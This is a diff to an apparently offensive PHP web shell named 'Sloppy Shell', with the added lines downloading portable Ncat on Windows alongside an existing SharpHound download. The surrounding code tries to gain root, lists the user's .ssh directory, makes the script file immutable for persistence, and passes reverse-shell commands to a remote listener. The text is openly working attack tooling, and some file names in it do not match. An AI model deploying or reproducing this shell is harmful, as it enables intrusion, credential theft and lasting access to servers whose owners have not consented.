@@ -4,7 +4,6 @@ umask(0);
 posix_setuid(0);
 define("base",'echo "Users Home Dir:";echo $HOME;echo"";echo "SSH Directory?";ls -lah $HOME/.ssh/;echo "";echo "Current Dir: ";pwd;ls -lah;echo "";echo "System: ";uname -as;echo "";echo "User: ";whoami');
 system("chattr +i ". $_SERVER["SCRIPT_FILENAME"]);
-
 function banner(){
     
     echo("\033[33;40m .▄▄ · ▄▄▌         ▄▄▄· ▄▄▄· ▄· ▄▌    .▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌   \033[0m\n");
@@ -12,7 +11,7 @@ function banner(){
     echo("\033[33;40m ▄▀▀▀█▄██▪   ▄█▀▄  ██▀· ██▀·▐█▌▐█▪    ▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪   \033[0m\n");
     echo("\033[33;40m ▐█▄▪▐█▐█▌▐▌▐█▌.▐▌▐█▪·•▐█▪·• ▐█▀·.    ▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌ \033[0m\n");
     echo("\033[33;40m  ▀▀▀▀ .▀▀▀  ▀█▄▀▪.▀   .▀     ▀ •      ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀  \033[0m\n");
-    echo("gr33tz: Notroot\nH4ppy h4ck1ng\n\n\n");
+    echo("gr33tz: Notroot Johnny5\nH4ppy h4ck1ng\n\n\n");
     
 }
 
@@ -228,6 +227,7 @@ function checkSystem()
         windows("bh", "dl");
         windows("azh", "dl");
         windows("bhe", "dl");
+        windows("ncW", "dl");
         return $os;
     } else {
         array_push($os,"Linux");
@@ -291,7 +291,6 @@ function reverseConnections($methods, $host, $port, $shell)
     if (!empty($methods)) {
         echo("\nAttempting to connect back, ensure you have the listener running.\n");
         echo("\nUsing: " . $methods . "\nRhost: " . $useHost . "\nRport: " . $usePort . "\nLshell: " . $useShell . "\n");
-
         passthru($comma[$methods]) or die("Something went wrong: ->" . error_get_last() . "\r\n\r\n\r\n");
     } else {
         echo("\nYou didnt specify a method to use, defaulting to bash.\n");
@@ -339,6 +338,12 @@ function windows($com, $r){
                     echo("Pulling Bloodhound Executable!\n");
                     shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?raw=true -OutFile af2.exe");
                     echo("\nFile downloaded to: ". $cdir . " af2.ps1");
+                    break;
+                case "ncW":
+                    echo("Pulling Ncat Executable!\n");
+                    shell_exec("Invoke-WebRequest -Uri http://nmap.org/dist/ncat-portable-5.59BETA1.zip -OutFile nc1.zip");
+                    shell_exec("Expand-Archive ncat-portable-5.59BETA1.zip $cdir");
+                    echo("\nFile expanded to: ". $cdir);
                     break;
             }
         }else{
